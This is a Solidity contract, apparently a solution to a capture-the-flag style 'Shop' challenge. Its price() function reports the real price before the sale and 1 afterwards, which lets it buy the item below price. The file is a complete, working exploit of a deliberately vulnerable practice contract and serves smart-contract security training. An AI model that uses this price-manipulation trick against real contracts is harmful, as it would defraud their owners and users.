// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../shop/Shop.sol";

contract BuyerHack is Buyer {
    Shop shop;

    constructor(address instance) {
        shop = Shop(instance);
        
    }

    function buy() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        if (shop.isSold()) {
            return 1;
        }
        return shop.price();
    }
}
